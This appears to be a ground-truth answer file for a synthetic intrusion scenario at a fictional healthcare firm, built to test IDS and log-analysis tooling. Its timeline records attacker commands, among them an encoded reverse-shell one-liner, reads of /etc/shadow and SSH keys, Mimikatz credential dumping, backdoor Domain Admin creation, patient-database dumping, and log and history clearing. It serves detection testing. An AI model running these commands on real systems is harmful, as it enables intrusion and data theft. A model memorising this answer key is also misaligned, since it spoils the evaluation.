# Ground Truth: iteration-test-expanded-ids

**Scenario:** IDS-focused variant of the expanded EvidenceForge iteration-test scenario for fast
generate/evaluate/fix cycles. It preserves the original environment and attack narrative
while adding authored, transport-correlated IDS assertions, sensor-local filtering, and
deliberate no-alert cases for broad automated and LLM-as-a-judge quality evaluation.
Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
integration services from a corporate HQ with an on-premises data center. The
storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
exfiltration, email abuse, and cleanup into a 6-hour collection window while
preserving broad event-type and log-format coverage. This expanded variant adds
explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
and deterministic background email traffic.


**Generated:** 2024-03-18 12:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **diego.ramirez** on **WS-DRAMIREZ-01**: External benefits-themed phishing message is delivered to Finance with hidden security Bcc
2. **diego.ramirez** on **WS-DRAMIREZ-01**: Finance user reads the suspicious benefits message through OWA
3. **diego.ramirez** on **WS-DRAMIREZ-01**: Diego forwards the suspicious message to the help desk and discreetly copies security
4. **root** on **WEB-EXT-01**: External attacker scans the DMZ for exposed services
5. **root** on **WEB-EXT-01**: External attacker runs Nikto web vulnerability scanning against the EHR portal
6. **root** on **LT-MRIVERA-02**: Rogue laptop obtains an address from DHCP on the corporate LAN
7. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an internal EHR release note to a clinical operations distribution group
8. **omar.haddad** on **WS-OHADDAD-01**: Analytics user reads the EHR release note through IMAPS
9. **apache** on **WEB-EXT-01**: SQL injection probes against the EHR portal produce server errors
10. **apache** on **WEB-EXT-01**: Web shell upload and reverse shell callback to direct-IP C2
11. **root** on **WEB-EXT-01**: Network and host discovery from the compromised web server
12. **priya.patel** on **WS-PPATEL-01**: A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment
13. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay
14. **root** on **WEB-EXT-01**: Harvest database credentials and SSH key material from the web server
15. **root** on **APP-INT-01**: Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01
16. **root** on **APP-INT-01**: Dump Linux password databases from APP-INT-01
17. **marcus.chen** on **WS-MCHEN-01**: Attacker uses explicit sysadmin credentials through RunAs
18. **root** on **LT-MRIVERA-02**: Wrong-password fumble before broader credential spray
19. **root** on **WS-AJOHNSON-01**: Credential spray succeeds against help desk user followed by RDP session
20. **aisha.johnson** on **WS-AJOHNSON-01**: Compromised help desk mailbox sends an internal credential-reset lure to finance
21. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker reads the compromised help desk mailbox through IMAPS
22. **aisha.johnson** on **WS-AJOHNSON-01**: Active Directory enumeration from compromised workstation
23. **aisha.johnson** on **WS-AJOHNSON-01**: Credential dumping with Mimikatz disguised as a Windows indexing service
24. **aisha.johnson** on **DC-01**: PsExec-style lateral movement to DC-01 through SMB service creation
25. **evelyn.brooks** on **WS-EBROOKS-01**: External invoice-themed attachment is rejected by the mail gateway
26. **SYSTEM** on **DC-01**: Create backdoor account and add it to Domain Admins
27. **SYSTEM** on **DC-01**: Install service and scheduled task persistence on DC-01
28. **SYSTEM** on **DC-01**: Allowed HTTPS beacon from DC-01 to attacker infrastructure
29. **SYSTEM** on **DC-01**: Direct C2 beacon attempts from DC-01 are blocked by firewall
30. **root** on **APP-INT-01**: DNS tunneling exfiltration from APP-INT-01
31. **evelyn.brooks** on **WS-EBROOKS-01**: Executive sends an inline-authored operating note to an outside advisor with internal Bcc
32. **root** on **WEB-EXT-01**: DGA queries from compromised web server
33. **svc_mhsync** on **FILE-SRV-01**: Backdoor account authenticates to FILE-SRV-01 and stages sensitive data
34. **root** on **DB-PROD-01**: SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01
35. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker locks compromised workstation before stepping away
36. **aisha.johnson** on **WS-AJOHNSON-01**: Upload compressed archive to external staging domain over HTTPS
37. **root** on **WEB-EXT-01**: Ongoing periodic beacon from WEB-EXT-01
38. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker returns and unlocks compromised workstation
39. **root** on **WEB-EXT-01**: Clear Linux shell history on WEB-EXT-01
40. **root** on **APP-INT-01**: Clear Linux shell history on APP-INT-01
41. **SYSTEM** on **DC-01**: Encoded PowerShell download and Security log clearing on DC-01
42. **root** on **APP-INT-01**: Standalone DNS queries for attacker infrastructure
43. **SYSTEM** on **DC-01**: Delete backdoor account after exfiltration
44. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker logs off compromised help desk workstation
45. **svc_mhsync** on **FILE-SRV-01**: Backdoor account session logs off FILE-SRV-01
46. **root** on **APP-INT-01**: Root SSH session logs off APP-INT-01


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-03-18 12:11:57 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: notices@benefits-serviceportal.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Benefits confirmation required today' (artifacts/email/benefits-confirmation-msg.eml) |
| 2024-03-18 12:18:27 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Read | Mailbox read: diego.ramirez@meridianhcs.com via owa on finance (UID: CocUzZWugSRovHiDMut) |
| 2024-03-18 12:23:57 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: diego.ramirez@meridianhcs.com -> aisha.johnson@meridianhcs.com, marcus.chen@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Fwd: Benefits confirmation required today' (artifacts/email/finance-forward-to-it-msg.eml) |
| 2024-03-18 12:29:49 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [22], 1 denied connections + ASA threat detection alert (733100) [IDS: SID 2002911 policy={'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=0 emitted=0 filtered=0] |
| 2024-03-18 12:29:50 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [80, 443, 8080, 8443, 3306], 5 denied connections + ASA threat detection alert (733100) |
| 2024-03-18 12:30:31 UTC | root | WEB-EXT-01 | Web_Scan | Web scan (nikto) against 10.10.3.10:443 (419 requests) |
| 2024-03-18 12:44:44 UTC | root | LT-MRIVERA-02 | Dhcp_Lease | DHCP lease for LT-MRIVERA-02 (MAC: DC:A6:32:44:91:7B) |
| 2024-03-18 12:48:12 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> lina.nguyen@meridianhcs.com, omar.haddad@meridianhcs.com, priya.patel@meridianhcs.com; subject 'EHR connector release notes' (artifacts/email/ehr-release-note-msg.eml) |
| 2024-03-18 12:53:22 UTC | omar.haddad | WS-OHADDAD-01 | Email_Read | Mailbox read: omar.haddad@meridianhcs.com via imaps on clinical (UID: CUJTa5kHyXAGUAK4bq) |
| 2024-03-18 12:59:32 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CcrDXztsHLNYgdt4OI) |
| 2024-03-18 12:59:33 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CqpA6g8vrvFAdmrikM5) |
| 2024-03-18 13:20:12 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CdFuzlOcf5iAq2cm6c) |
| 2024-03-18 13:20:14 UTC | apache | WEB-EXT-01 | Process | Process: /bin/bash (PID: 581455) - `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L...` |
| 2024-03-18 13:20:15 UTC | apache | WEB-EXT-01 | Connection | Connection to 45.33.32.30:8443 (UID: CKZ8KOPhVr9c7BtBPmX) |
| 2024-03-18 13:20:26 UTC | apache | WEB-EXT-01 | Raw | Web shell upload and reverse shell callback to direct-IP C2 |
| 2024-03-18 13:39:56 UTC | root | WEB-EXT-01 | Process | Process: /usr/sbin/ip (PID: 584325) - `ip addr show` |
| 2024-03-18 13:40:00 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584369) - `cat /etc/hosts` |
| 2024-03-18 13:40:16 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584443) - `cat /etc/resolv.conf` |
| 2024-03-18 13:40:50 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/find (PID: 584757) - `find /opt/ehr -name '*credential*' -maxdepth 3` |
| 2024-03-18 13:43:10 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 584926) - `nmap -sn 10.10.2.0/24` |
| 2024-03-18 13:44:21 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 584945) - `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24` |
| 2024-03-18 13:50:15 UTC | priya.patel | WS-PPATEL-01 | Email_Message | Email delivered: workspace@docflow-health.net -> priya.patel@meridianhcs.com; subject 'DocFlow summary package: vendor terms' (artifacts/email/docflow-ai-summary-msg.eml) |
| 2024-03-18 13:55:55 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> miles.avery@stonebridge-consultingllc.com, omar.haddad@meridianhcs.com; subject 'Stonebridge interface package comments' (artifacts/email/vendor-interface-package-msg.eml) |
| 2024-03-18 14:00:06 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587154) - `cat /var/www/html/config.php` |
| 2024-03-18 14:00:10 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/ls (PID: 587193) - `ls -la /root/.ssh` |
| 2024-03-18 14:00:35 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587212) - `cat /root/.ssh/id_rsa` |
| 2024-03-18 14:15:03 UTC | root | APP-INT-01 | Connection | Connection to 10.10.3.20:22 (UID: CPxBu3Ut1uH9qCa9yy) |
| 2024-03-18 14:15:14 UTC | root | APP-INT-01 | Ssh_Session | SSH session to 10.10.2.30:22 (UID: CFbzIm0dAkzEvnjfot) [IDS: SID 2002911 policy={'detection_filter': None, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=2 emitted=2 filtered=0] |
| 2024-03-18 14:35:27 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962188) - `cat /etc/passwd` |
| 2024-03-18 14:35:34 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962201) - `cat /etc/shadow` |
| 2024-03-18 14:50:16 UTC | marcus.chen | WS-MCHEN-01 | Explicit_Credentials | Explicit credentials: RunAs marcus.chen on DC-01 |
| 2024-03-18 14:59:13 UTC | root | LT-MRIVERA-02 | Failed_Logon | Wrong-password fumble before broader credential spray |
| 2024-03-18 14:59:56 UTC | root | WS-AJOHNSON-01 | Credential_Spray | Credential spray: 4 attempts against 3 accounts (success: aisha.johnson at attempt 4) |
| 2024-03-18 14:59:58 UTC | aisha.johnson | WS-AJOHNSON-01 | Rdp_Session | RDP session to 10.10.1.35:3389 (UID: CFEILIJzQD4QE6gXpSW) |
| 2024-03-18 15:08:08 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Message | Email delivered: aisha.johnson@meridianhcs.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, marcus.chen@meridianhcs.com; subject 'Help desk follow-up: credential reset validation' (artifacts/email/internal-reset-lure-msg.eml) |
| 2024-03-18 15:14:17 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Read | Mailbox read: aisha.johnson@meridianhcs.com via imaps on edge (UID: Cqmfl0qiZxw5DhxV2) |
| 2024-03-18 15:19:43 UTC | aisha.johnson | WS-AJOHNSON-01 | Logon | Network logon from 10.10.1.99 (LogonID: 0x26ffec8) |
| 2024-03-18 15:19:44 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\whoami.exe (PID: 6316) - `whoami /all` |
| 2024-03-18 15:19:47 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6356) - `net user /domain` |
| 2024-03-18 15:19:47 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6364) - `net group "Domain Admins" /domain` |
| 2024-03-18 15:20:01 UTC | aisha.johnson | WS-AJOHNSON-01 | Dns_Query | DNS query: DC-01.meridianhcs.local (A, NOERROR) |
| 2024-03-18 15:20:01 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6376) - `net view /domain` |
| 2024-03-18 15:20:03 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:389 (UID: CjSy8xT0S0sab0punq) |
| 2024-03-18 15:44:37 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\ms-index-service.exe (PID: 6392) - `ms-index-service.exe "privilege::debug" "sekurl...` |
| 2024-03-18 15:44:38 UTC | aisha.johnson | WS-AJOHNSON-01 | Process_Access | Credential dumping with Mimikatz disguised as a Windows indexing service |
| 2024-03-18 15:44:41 UTC | aisha.johnson | WS-AJOHNSON-01 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2024-03-18 15:59:41 UTC | aisha.johnson | DC-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0x5553110) |
| 2024-03-18 15:59:42 UTC | aisha.johnson | DC-01 | Service_Installed | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) |
| 2024-03-18 15:59:45 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\PSEXESVC.exe (PID: 5632) - `PSEXESVC.exe -accepteula` |
| 2024-03-18 15:59:46 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 5636) - `cmd.exe /c whoami && hostname` |
| 2024-03-18 16:06:39 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email rejected: billing@medclaims-processing.net -> evelyn.brooks@meridianhcs.com; subject 'Updated claims processing invoice' (metadata-only) |
| 2024-03-18 16:15:11 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5652) - `net user svc_mhsync MhsSvc!2024 /add /domain` |
| 2024-03-18 16:15:13 UTC | SYSTEM | DC-01 | Account_Created | Account created: svc_mhsync |
| 2024-03-18 16:15:14 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5660) - `net group "Domain Admins" svc_mhsync /add /domain` |
| 2024-03-18 16:15:15 UTC | SYSTEM | DC-01 | Group_Member_Added | Added svc_mhsync to group Domain Admins |
| 2024-03-18 16:19:46 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 5672) - `sc.exe create DeviceSyncSvc binPath= C:\Windows...` |
| 2024-03-18 16:19:47 UTC | SYSTEM | DC-01 | Service_Installed | Service installed: DeviceSyncSvc (C:\Windows\System32\DeviceSyncSvc.exe) |
| 2024-03-18 16:19:48 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 5712) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2024-03-18 16:19:49 UTC | SYSTEM | DC-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\DeviceSync |
| 2024-03-18 16:29:53 UTC | SYSTEM | DC-01 | Beacon | Beacon to 45.33.32.30:443 (10 attempts, 1h30m) |
| 2024-03-18 16:31:00 UTC | SYSTEM | DC-01 | Beacon | Denied beacon to 45.33.32.30:443 (4 attempts, 1h30m) |
| 2024-03-18 16:44:37 UTC | root | APP-INT-01 | Dns_Tunnel | DNS tunnel via ns1.westbridge-services.cloud (hex, 302 queries, 1588 bytes exfiltrated) [IDS: SID 2029706 policy={'detection_filter': {'track': 'by_src', 'count': 10, 'seconds': 60}, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 2, 'seconds': 300}} candidates=300 emitted=6 filtered=294] |
| 2024-03-18 16:50:19 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email delivered: evelyn.brooks@meridianhcs.com -> marina.holt@northbridge-advisory.com, diego.ramirez@meridianhcs.com, priya.patel@meridianhcs.com; subject 'March operating note' (artifacts/email/executive-operating-note-msg.eml) |
| 2024-03-18 17:00:21 UTC | root | WEB-EXT-01 | Dga_Queries | DGA queries: 91 total (80 NXDOMAIN, TLD: .top, sample: ['ewnjsaqf1rasgez5.top', '6cja6syvo02mu.top', '30rgw6r7503.top']) [IDS: SID 2027865 policy={'detection_filter': {'track': 'by_src', 'count': 2, 'seconds': 120}, 'event_filter': {'type': 'both', 'track': 'by_src', 'count': 1, 'seconds': 300}} candidates=178 emitted=18 filtered=160] |
| 2024-03-18 17:00:36 UTC | svc_mhsync | FILE-SRV-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0xf88438f) |
| 2024-03-18 17:00:37 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6176) - `net view \\FILE-SRV-01` |
| 2024-03-18 17:00:39 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6208) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2024-03-18 17:15:14 UTC | root | DB-PROD-01 | Ssh_Session | SSH session to 10.10.4.10:22 (UID: C4Fmq8RXtdD7RSexxkl) |
| 2024-03-18 17:15:15 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/mysqldump (PID: 158389) - `mysqldump --single-transaction ehr patients ins...` |
| 2024-03-18 17:16:36 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/gzip (PID: 158949) - `gzip -9 /tmp/rpt_0318.sql` |
| 2024-03-18 17:19:58 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/scp (PID: 159339) - `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/....` |
| 2024-03-18 17:20:13 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Lock | Workstation Locked |
| 2024-03-18 17:25:21 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 45.33.32.30:443 (UID: CS2h7ir7BegQ2YQsAX) |
| 2024-03-18 17:29:32 UTC | root | WEB-EXT-01 | Beacon | Beacon to 45.33.32.30:443 (3 attempts, count=3) |
| 2024-03-18 17:35:21 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Unlock | Workstation Unlocked |
| 2024-03-18 17:40:10 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/shred (PID: 608797) - `shred -u /root/.bash_history` |
| 2024-03-18 17:41:25 UTC | root | APP-INT-01 | Process | Process: /bin/bash (PID: 982906) - `history -c && cat /dev/null > ~/.bash_history` |
| 2024-03-18 17:41:36 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6136) - `powershell.exe -NoProfile -EncodedCommand SQBFA...` |
| 2024-03-18 17:41:38 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 6148) - `wevtutil cl Security` |
| 2024-03-18 17:41:39 UTC | SYSTEM | DC-01 | Log_Cleared | Encoded PowerShell download and Security log clearing on DC-01 |
| 2024-03-18 17:44:46 UTC | root | APP-INT-01 | Dns_Query | DNS query: edge.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:44:46 UTC | root | APP-INT-01 | Dns_Query | DNS query: api.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:44:48 UTC | root | APP-INT-01 | Dns_Query | DNS query: metrics.westbridge-services.net (TXT, NXDOMAIN) |
| 2024-03-18 17:50:07 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6188) - `net user svc_mhsync /delete /domain` |
| 2024-03-18 17:50:08 UTC | SYSTEM | DC-01 | Account_Deleted | Account deleted: svc_mhsync |
| 2024-03-18 17:55:14 UTC | aisha.johnson | WS-AJOHNSON-01 | Logoff | Attacker logs off compromised help desk workstation |
| 2024-03-18 17:56:26 UTC | svc_mhsync | FILE-SRV-01 | Logoff | Backdoor account session logs off FILE-SRV-01 |
| 2024-03-18 17:57:07 UTC | root | APP-INT-01 | Logoff | Root SSH session logs off APP-INT-01 |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| 0147b725-3e3b-43b3-a37f-9e17eec257f4 | ids | delayed: 2 |
| 064f62ca-beaa-44bd-b1c9-6f20cfb13cc3 | ids | delayed: 1 |
| 06d04dba-07a5-4441-a413-2ef52610811d | ids | delayed: 1 |
| 085a9340-8f83-4cae-975f-29f01bf9eaf6 | ids | delayed: 2 |
| 0bea834c-7ec1-48ad-94c7-74a19b4d094c | ids | delayed: 1 |
| 0d73ece2-5e38-4d66-bb8a-bfd6097e8a34 | ids | visible: 1 |
| 0e422527-69bf-4c41-8fcf-55d2dffeca72 | ids | delayed: 1 |
| 0ee0de66-a836-4e9f-80a3-4b55d0e04e2e | ids | delayed: 1 |
| 0f503f62-a43b-4a46-a307-73ccf1411671 | ids | delayed: 1 |
| 10b7d5d2-20a8-42a8-a077-90f87bda96bd | ids | delayed: 1 |
| 10c28436-bc11-4d33-8352-c0d2755cc0d6 | ids | delayed: 1 |
| 1200a7cc-8a2d-44f0-8307-2f4d3f64903e | ids | delayed: 1 |
| 12575c66-0e5e-4d09-898f-6af0d1125733 | ids | delayed: 1 |
| 12d6f767-59f0-4911-a272-23892c0b3675 | ids | delayed: 1 |
| 18f586d6-aa46-44f7-b7b2-897c86a4831f | ids | delayed: 2 |
| 1c2725c7-0784-4c16-a07a-a54baf848eb6 | ids | delayed: 1 |
| 1e909981-5c1f-420a-a112-ceaa4eec61b4 | ids | delayed: 1 |
| 2295997a-bf61-48d3-abf9-3e12cfe0021f | ids | delayed: 1 |
| 24849454-aef2-4cef-8be6-35ab5b8bd669 | ids | delayed: 1 |
| 2616f742-18ac-4a73-b8da-fd127e427326 | ids | delayed: 1 |
| 2a1fcf08-11ef-4243-b111-b61c280ff285 | ids | visible: 1 |
| 2b9a86a8-0dbc-44ae-bac0-0b2a8741b15c | ids | delayed: 2 |
| 2c7aec1c-df45-45ba-8c04-987b3f54f825 | ids | delayed: 1 |
| 2c9e772a-b96d-4026-a111-44191b18eaff | ids | delayed: 1 |
| 2de4f81a-bb4f-4281-b0b9-3d9899aabe70 | ids | delayed: 2 |
| 2f5f51cf-49a6-4225-ab31-0876958cbf66 | ids | delayed: 1 |
| 30e277b1-7c37-4644-beac-85ca37c390f4 | ids | delayed: 1 |
| 32765041-8baa-4f04-b3c2-a12d88531df1 | ids | delayed: 1 |
| 34c80a5c-9c45-4cca-b785-e18689750070 | ids | delayed: 1 |
| 35c486d4-74c8-48d4-b00c-322e7dfc3b15 | ids | delayed: 1 |
| 3782fb6e-0043-466a-a62f-0e8ecee8aa87 | ids | delayed: 1 |
| 394c232c-df44-4b38-8f52-a89fc92874b7 | ids | delayed: 1 |
| 39bd22ea-e089-47ae-9c73-df4250137f10 | ids | delayed: 1 |
| 3c666818-119d-434b-95e7-3c3424f165a1 | ids | delayed: 1 |
| 3c7bb421-c563-4d3c-a8a3-c6c3c3c37936 | ids | delayed: 2 |
| 3eedb7bd-e50d-4cc0-b99a-d475584ed437 | ids | delayed: 1 |
| 44e7e0c2-0109-4827-89a2-d929e478037e | ids | delayed: 1 |
| 49d3165c-7bf6-4f63-835c-569b3346de59 | ids | delayed: 1 |
| 513b9f11-a3c6-4e7b-b538-3d90cef6d62b | ids | delayed: 1 |
| 58ab24f0-b7b2-4c83-9445-63c5c22ebf0e | ids | delayed: 1 |
| 58af502b-5d34-424e-864a-5000d2df0d73 | ids | delayed: 1 |
| 596290a7-735b-430c-8d24-4dab1b1b9354 | ids | delayed: 1 |
| 5ffca260-135e-4db1-bc88-1393efbb4557 | ids | delayed: 1 |
| 609d88b6-2cbd-4da0-9d19-0aa796a995dc | ids | delayed: 1 |
| 61ac3b5e-b309-48b1-9056-e37265958e42 | ids | delayed: 1 |
| 6c88a456-6ab6-4fdd-b51d-6d67fdf447a0 | ids | delayed: 1 |
| 6cb14dff-96f9-40a0-b46f-3c74b19a17a7 | ids | delayed: 1 |
| 6e47a1b7-e2e1-477b-9430-1fc4354d6c63 | ids | delayed: 2 |
| 6e813be4-3eb7-4e9f-ac07-b5e82f43c5da | ids | delayed: 1 |
| 6e8b9ed3-31e9-447f-8fee-03fbcdf2fff9 | ids | delayed: 1 |
| 6ee23ff9-0a74-4439-8e5e-b18b6b376aec | ids | delayed: 1 |
| 71aab762-15c7-4ce6-b91c-57c72a2ccb30 | ids | delayed: 1 |
| 71b16b5b-fdb7-410f-8133-3daf6bf16e49 | ids | delayed: 1 |
| 72ecafa1-46e1-49f1-9cde-33c811aab7f3 | ids | delayed: 1 |
| 73453e7a-456d-4846-9225-fd7b20f3b78f | ids | delayed: 1 |
| 7379d86a-779f-4b75-ac45-a556053dbcc3 | ids | delayed: 1 |
| 73af28dc-2dbc-4d94-ae8c-fa5f97eb4a68 | ids | delayed: 1 |
| 7438e17b-eed8-442c-aac4-d33d6810fae7 | ids | delayed: 1 |
| 75a76f06-7360-4dcc-bd76-83a46cf3ab47 | ids | delayed: 1 |
| 79255bf1-a1fb-414d-9448-87c326d3fc9f | ids | delayed: 1 |
| 79a1a417-3bc6-484f-805c-3d9c14329e34 | ids | delayed: 1 |
| 7ba2920f-04c8-4228-9322-43652d16d745 | ids | delayed: 1 |
| 7c3d0a2f-6b91-4768-ab97-a8bf9543a515 | ids | delayed: 2 |
| 7ea28724-d0da-4c8a-8a99-269b52465304 | ids | delayed: 1 |
| 84f21715-01e6-457c-9225-551eba7bd272 | ids | delayed: 1 |
| 884f80a1-89f5-4bc6-9088-dbb9a407d3f2 | ids | delayed: 1 |
| 8865b8bc-4aa1-4d96-a8e9-2d6d46c4b690 | ids | delayed: 1 |
| 899c22c1-1656-4537-9f1c-8179ff5ec71a | ids | delayed: 1 |
| 8a8b967b-2bae-487c-ab46-8980443ff1c0 | ids | delayed: 1 |
| 8c8e1f9b-114d-41e4-b820-4782d382cb5f | ids | delayed: 1 |
| 8e6b758c-19af-4d94-bd12-ad82fe1a4e29 | ids | delayed: 1 |
| 9514636a-d5be-48b5-8cea-188e61df1691 | ids | delayed: 1 |
| 9603bd0e-0cf4-4df5-89a6-e561eb30617a | ids | delayed: 1 |
| 969cce42-c9da-420c-82d0-34e27474b894 | ids | delayed: 2 |
| 96b1ca1d-781b-4151-9ce6-411e689bf2b9 | ids | delayed: 1 |
| 9b564dbc-7929-4ca9-9982-a1cee6490904 | ids | delayed: 1 |
| 9fa0ff4e-ebce-4380-9175-8e42656d427c | ids | delayed: 1 |
| a0c92fdd-a0cf-40cc-87db-7c661b81da38 | ids | delayed: 1 |
| a12e4ac2-f3fc-473d-8b1b-ff3be5618c3f | ids | delayed: 1 |
| a238519b-0ec3-478f-887c-ce20b164de8b | ids | delayed: 1 |
| a2d1587d-d78c-4725-a8e4-5ddd2a311a52 | ids | delayed: 1 |
| a557e3af-ea2b-47a4-8031-76c6ffa0e662 | ids | delayed: 1 |
| a83a38a5-da1b-4ef8-9ed9-84cbd01f500d | ids | delayed: 1 |
| a9b94a2c-f41b-4f39-95aa-5c179015aea4 | ids | delayed: 1 |
| aba590ab-d660-49df-a4dc-ea9c2c43acb6 | ids | delayed: 1 |
| abaa970e-6a4e-4cc2-9a6d-948dfa97567c | ids | delayed: 1 |
| ad5cfbb4-ac86-4ac5-91eb-8c35b38b48e6 | ids | delayed: 1 |
| afdbdba2-baa1-452b-8b8e-f345d9f36918 | ids | delayed: 1 |
| b63e34aa-8517-4627-9138-3f633f1849f9 | ids | delayed: 1 |
| bdc7985e-0f53-4f25-9edd-de34c0163658 | ids | delayed: 1 |
| bdf2cd9f-fb72-405b-934a-84b18d657178 | ids | delayed: 1 |
| c0783051-3801-4680-8234-40921b1c4620 | ids | delayed: 1 |
| c1443d06-9d01-4916-890f-a58d82f03c34 | ids | delayed: 1 |
| c2b0cfb8-7d79-47a2-88e4-2cab9cf583f6 | ids | delayed: 1 |
| c689aa4c-82ae-4791-97e5-d8a05b35cb5a | ids | delayed: 1 |
| c81621e6-273c-4fbe-b0dc-252a1724961d | ids | delayed: 1 |
| c82d0447-613f-41e1-ab1d-ea9cae2c403c | ids | delayed: 1 |
| ca815e0b-a004-41f0-b639-0a625c5c9440 | ids | delayed: 1 |
| ce367c18-b030-4215-a175-ffb177a235c7 | ids | delayed: 1 |
| ce9bc12e-6a1f-40c5-9d67-915fc9084c93 | ids | delayed: 1 |
| d1134d63-538e-4acb-9d25-85df74575ead | ids | delayed: 1 |
| d1c971ae-93dc-46c1-8b01-cbb69e33b1d7 | ids | delayed: 1 |
| d31cffc1-1b70-4644-b1aa-d42fa5164950 | ids | delayed: 1 |
| d3d242b9-df60-4cdc-bd43-586060b87084 | ids | delayed: 1 |
| d67d0d0f-417a-4278-ae71-b2011ffec97d | ids | delayed: 1 |
| d8fc9694-57e5-4500-beba-f92f6756bc66 | ids | delayed: 1 |
| da5c4e47-ebcb-4933-80f8-dc2258a3af41 | ids | delayed: 1 |
| dc5736df-04b4-46e4-a525-670ae2d7811a | ids | delayed: 1 |
